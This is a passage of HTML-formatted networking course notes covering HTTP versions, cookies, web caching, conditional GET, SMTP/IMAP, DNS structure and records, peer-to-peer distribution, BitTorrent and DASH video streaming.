&lt;li&gt;HTTP 1.1 introduced first-come-first-served which can block small objects behind large objects&lt;/li&gt;
&lt;li&gt;HTTP 2 introduces transmission priority&lt;/li&gt;
&lt;li&gt;divide objects into frames, schedule frames to mitigate head-of-
line blocking&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;http3&#34; &gt;HTTP/3
&lt;span&gt;
    &lt;a href=&#34;#http3&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;HTTP/2
&lt;ul&gt;
&lt;li&gt;recovery from packet loss still stalls all object transmissions&lt;/li&gt;
&lt;li&gt;browsers have incentive to open multiple parallel TCP connections to reduce stalling&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HTTP/3
&lt;ul&gt;
&lt;li&gt;adds security, per object error and congestion-control over UDP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;maintaining-state-with-cookies&#34; &gt;Maintaining State With Cookies
&lt;span&gt;
    &lt;a href=&#34;#maintaining-state-with-cookies&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;Cookie header line of HTTP response message&lt;/li&gt;
&lt;li&gt;Cookie header line of HTTP request message&lt;/li&gt;
&lt;li&gt;Cookie file kept on users&amp;rsquo; host managed by browser&lt;/li&gt;
&lt;li&gt;backend database at website&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Can be as simple as backend creating a unique ID in a database and giving a cookie to the user so that it can identify the user in subsequent requests.&lt;/p&gt;
&lt;p&gt;What cookies can be used for :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;authorization&lt;/li&gt;
&lt;li&gt;shopping carts&lt;/li&gt;
&lt;li&gt;recommendations&lt;/li&gt;
&lt;li&gt;user session state (Web e-mail)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Keeping state:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;maintain state at
sender/receiver over multiple
transactions&lt;/li&gt;
&lt;li&gt;could be just for a session&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;web-caches-proxy-server&#34; &gt;Web Caches (Proxy Server)
&lt;span&gt;
    &lt;a href=&#34;#web-caches-proxy-server&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;why don&amp;rsquo;t we keep the query result somewhere closer to us to reuse&lt;/li&gt;
&lt;li&gt;server tells cache about object’s allowable caching in response header
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Cache-Control: max-age=&amp;lt;seconds&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Cache-Control: no-cache&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;reduces response time for client&lt;/li&gt;
&lt;li&gt;reduce traffic on an institution&amp;rsquo;s access link&lt;/li&gt;
&lt;li&gt;internet dense with caches to enable poor content providers to more effectively deliver content&lt;/li&gt;
&lt;li&gt;First configure your machine and browser configured with a proxy server&lt;/li&gt;
&lt;/ul&gt;
&lt;details&gt;&lt;summary&gt;Caching example&lt;/summary&gt;
&lt;ul&gt;
&lt;li&gt;access link rate: 1.54Mbps&lt;/li&gt;
&lt;li&gt;RTT from institutional router to server: 2 seconds&lt;/li&gt;
&lt;li&gt;web object size: 100K bits&lt;/li&gt;
&lt;li&gt;Average request rate: 15/sec
&lt;ul&gt;
&lt;li&gt;Average data rate to browsers: 1.50Mbps&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Performance&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;access link utilization = 0.97 (1.50 / 1.54)&lt;/li&gt;
&lt;li&gt;LAN utilization = 0.0015&lt;/li&gt;
&lt;li&gt;End-end delay = Internet delay + access link delay + LAN delay = 2 sec + mins + usecs&lt;/li&gt;
&lt;li&gt;Another way to think about end-end delay: time to gather bits for a packet, time to transmit the packet, and time to propagate the packet, plus the time to process and queue&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Options to improve&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Buy faster access link → faster access link rate → lower access link utilization&lt;/li&gt;
&lt;li&gt;Install a web cache to handle redundant requests
&lt;ul&gt;
&lt;li&gt;Assume a hit rate of 0.4 → 0.6 * 1.5 = 0.9 Mbps rate to browsers&lt;/li&gt;
&lt;li&gt;Access rate utilization = 0.9 / 1.54 = 0.58&lt;/li&gt;
&lt;li&gt;Average end-end- delay = 0.6 * (delay from origin) + 0.4 * (delay when satisfied at cache)&lt;/li&gt;
&lt;li&gt;LAN utilization →&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/details&gt;
&lt;h3 id=&#34;conditional-get&#34; &gt;Conditional GET
&lt;span&gt;
    &lt;a href=&#34;#conditional-get&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;don’t send object if cache has up-to-date cached version&lt;/li&gt;
&lt;li&gt;specify date of cached copy in HTTP request
&lt;ul&gt;
&lt;li&gt;Header: &lt;code&gt;If-modified-since: &amp;lt;date&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Server
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HTTP/1.0 304 Not Modified&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Implementation notes
&lt;ul&gt;
&lt;li&gt;If the backend is being updated, set default date of the database schema to the day after the feature was rolled out (in debugging, test both future date and older date). When a client requests a route/object (with authorization), if the if-modified-since: date is definite&lt;/li&gt;
&lt;li&gt;frontend: simply keep track in persistent storage (local storage, IndexDB, preferred, shared preferences, DataStore)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;e-mail&#34; &gt;E-mail
&lt;span&gt;
    &lt;a href=&#34;#e-mail&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;user agents&lt;/li&gt;
&lt;li&gt;mail servers&lt;/li&gt;
&lt;li&gt;simple mail transfer protocol: SMTP&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;User Agent&lt;/p&gt;
&lt;p&gt;SMTP RFC (5321)&lt;/p&gt;
&lt;p&gt;TCP three phases:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;handshaking (3 RTTs)&lt;/li&gt;
&lt;li&gt;transfer of messages&lt;/li&gt;
&lt;li&gt;closure&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SMTP Origin&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check sender&lt;/li&gt;
&lt;li&gt;Check recipient&lt;/li&gt;
&lt;li&gt;Send DATA ending with &amp;ldquo;.&amp;rdquo; on a line by itself&lt;/li&gt;
&lt;li&gt;Message added to queue&lt;/li&gt;
&lt;li&gt;After sending all the mail, send QUIT to close TCP connection&lt;/li&gt;
&lt;li&gt;One RTT for each of these stages, but since the connection is persistent, we don&amp;rsquo;t expense double the RTT&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;IMAP (Internet Mail Access Protocol)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Internet Mail Access Protocol [RFC 3501]: messages stored on server&lt;/li&gt;
&lt;li&gt;IMAP provides retrieval, deletion, folders of stored messages on server&lt;/li&gt;
&lt;li&gt;HTTP: web-based interfaces on top of SMTP and IMAP (or POP)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;domain-name-system&#34; &gt;Domain Name System
&lt;span&gt;
    &lt;a href=&#34;#domain-name-system&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;distributed database implemented in hierarchy of many name servers&lt;/li&gt;
&lt;li&gt;application-layer protocol: hosts, DNS servers communicate to resolve names&lt;/li&gt;
&lt;li&gt;services
&lt;ul&gt;
&lt;li&gt;hostname to IP address translation&lt;/li&gt;
&lt;li&gt;host aliasing
&lt;ul&gt;
&lt;li&gt;canonical, alias names&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;mail server aliasing&lt;/li&gt;
&lt;li&gt;load distribution&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;don&amp;rsquo;t want to centralize
&lt;ul&gt;
&lt;li&gt;single point of failure&lt;/li&gt;
&lt;li&gt;traffic volume (Billions to Trillions a day)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;more reads than writes&lt;/li&gt;
&lt;li&gt;performance matters&lt;/li&gt;
&lt;li&gt;physically decentralized&lt;/li&gt;
&lt;li&gt;root DNS servers (13 logical servers, ICANN)
&lt;ul&gt;
&lt;li&gt;.com DNS servers
&lt;ul&gt;
&lt;li&gt;individual website.com DNS servers (e.g. \www.amazon.com)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;top-level-domain&#34; &gt;Top Level Domain
&lt;span&gt;
    &lt;a href=&#34;#top-level-domain&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;responsible for .com, .org, .net, .edu, .aero, .jobs, .museums, and all top-level country domains, e.g.: .cn, .uk, .fr, .ca, .jp&lt;/li&gt;
&lt;li&gt;Network Solutions: authoritative registry for .com, .net TLD&lt;/li&gt;
&lt;li&gt;Educause: .edu TLD&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;authoritative-dns-servers&#34; &gt;Authoritative DNS Servers
&lt;span&gt;
    &lt;a href=&#34;#authoritative-dns-servers&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;organization’s own DNS server provided by self or service provider&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;local-dns-server&#34; &gt;Local DNS Server
&lt;span&gt;
    &lt;a href=&#34;#local-dns-server&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;local name servers&lt;/li&gt;
&lt;li&gt;return from cache which could be out of date&lt;/li&gt;
&lt;li&gt;Use a TTL to expire cache entires
&lt;ul&gt;
&lt;li&gt;If the hostname IP changes, need all TTLs to expire&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dns-records&#34; &gt;DNS Records
&lt;span&gt;
    &lt;a href=&#34;#dns-records&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;type=CNAME
&lt;ul&gt;
&lt;li&gt;name to name&lt;/li&gt;
&lt;li&gt;name is alias for the canonical name&lt;/li&gt;
&lt;li&gt;value is the canonical name&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www.ibm.com&lt;/code&gt; → &lt;code&gt;severeast.backup2.ibm.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;similar to symbolic links and shortcuts&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;type=A
&lt;ul&gt;
&lt;li&gt;name to IP&lt;/li&gt;
&lt;li&gt;name is hostname, value is IP address&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;type=NS
&lt;ul&gt;
&lt;li&gt;name to authoritative name server which indicates the other DNS records&lt;/li&gt;
&lt;li&gt;name is the domain, value is hostname of the authoritative name server for the domain&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;type=MX
&lt;ul&gt;
&lt;li&gt;value is the hostname of the SMTP name server associated with the current domain NAME&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dns-protocol-messages&#34; &gt;DNS Protocol Messages
&lt;span&gt;
    &lt;a href=&#34;#dns-protocol-messages&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Identification
&lt;ul&gt;
&lt;li&gt;16 bit number for query and in reply&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Flags
&lt;ul&gt;
&lt;li&gt;query or reply&lt;/li&gt;
&lt;li&gt;recursion desired?&lt;/li&gt;
&lt;li&gt;recursion available?&lt;/li&gt;
&lt;li&gt;reply is authoritative&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dns-registar&#34; &gt;DNS Registar
&lt;span&gt;
    &lt;a href=&#34;#dns-registar&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;register domain with DNS registrar (Network Solutions for .com)
&lt;ul&gt;
&lt;li&gt;provide names, IP addresses of authoritative name server (primary, and secondary)&lt;/li&gt;
&lt;li&gt;registar inserts NS, A, resource records (RR) into the .com TLD server&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dns-security&#34; &gt;DNS Security
&lt;span&gt;
    &lt;a href=&#34;#dns-security&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;DDOS
&lt;ul&gt;
&lt;li&gt;root servers can handle it&lt;/li&gt;
&lt;li&gt;more dangerous for TLD servers&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Spoofing attacks
&lt;ul&gt;
&lt;li&gt;intercept DNS queries, return bogus reply&lt;/li&gt;
&lt;li&gt;RFC 4033 (authentication services)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;peer-to-peer-p2p-architecture&#34; &gt;Peer-to-peer (P2P) architecture
&lt;span&gt;
    &lt;a href=&#34;#peer-to-peer-p2p-architecture&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;self scalability&lt;/li&gt;
&lt;li&gt;no always-on server&lt;/li&gt;
&lt;li&gt;complex management
&lt;ul&gt;
&lt;li&gt;not attractive to develop, but would want to pay for it to be developed&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;time to distribute in server to many clients is the max of either the server upload divided by the number of downloads or the download speeds of the clients&lt;/li&gt;
&lt;li&gt;With P2P, the server uploads at least one, but takes advantage of each client&amp;rsquo;s upload speed
&lt;ul&gt;
&lt;li&gt;D &amp;gt;= max{ F/us, F/dmin, NF/(us+ sum u)}&lt;/li&gt;
&lt;li&gt;server one upload, slowest client download, all clients helping server with uploading&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;bittorrent&#34; &gt;BitTorrent
&lt;span&gt;
    &lt;a href=&#34;#bittorrent&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;256Kb chunks&lt;/li&gt;
&lt;li&gt;&lt;em&gt;tracker&lt;/em&gt;: tracks peers participating in swarm&lt;/li&gt;
&lt;li&gt;&lt;em&gt;swarm&lt;/em&gt;: group of peers exchanging chunks of a file&lt;/li&gt;
&lt;li&gt;&lt;em&gt;churn&lt;/em&gt;: peers may come and go&lt;/li&gt;
&lt;li&gt;periodically need to ask each peer for list of chunks that they have&lt;/li&gt;
&lt;li&gt;request missing chunks from peers, rarest first!&lt;/li&gt;
&lt;li&gt;send chunks to top 4 who have sending her chunks at highest rate&lt;/li&gt;
&lt;li&gt;re-evaluate top 4 every 10 seconds&lt;/li&gt;
&lt;li&gt;every 30 seconds, randomly select another peer to send chunks to (unchoke)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;streaming-video-dash&#34; &gt;Streaming Video (DASH)
&lt;span&gt;
    &lt;a href=&#34;#streaming-video-dash&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Dynamic, Adaptive Streaming over HTTP&lt;/li&gt;
&lt;li&gt;manifest file: provides URLs for different chunks&lt;/li&gt;
&lt;li&gt;divide video into multiple chunks&lt;/li&gt;
&lt;li&gt;each chunk encoded at multiple different rates&lt;/li&gt;
&lt;li&gt;different rate encodings stored in different files&lt;/li&gt;
&lt;li&gt;files replicated in various CDN nodes&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The client needs to&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;periodically estimate server-to-client bandwidth&lt;/li&gt;
&lt;li&gt;consulting manifest, requests one chunk at a time&lt;/li&gt;
&lt;li&gt;chooses maximum coding rate sustainable given current bandwidth&lt;/li&gt;
&lt;li&gt;can choose different coding rates at different points in time&lt;/li&gt;
&lt;li&gt;when to request chunk (avoid buffer overflow), what encoding rate, where to request chunk (which server to request from)&lt;/li&gt;
&lt;li&gt;streaming video = encoding + DASH + playout buffer&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;content-distribution-network-cdns&#34; &gt;Content Distribution Network (CDNs)
&lt;span&gt;
    &lt;a href=&#34;#content-distribution-network-cdns&#34;&gt;
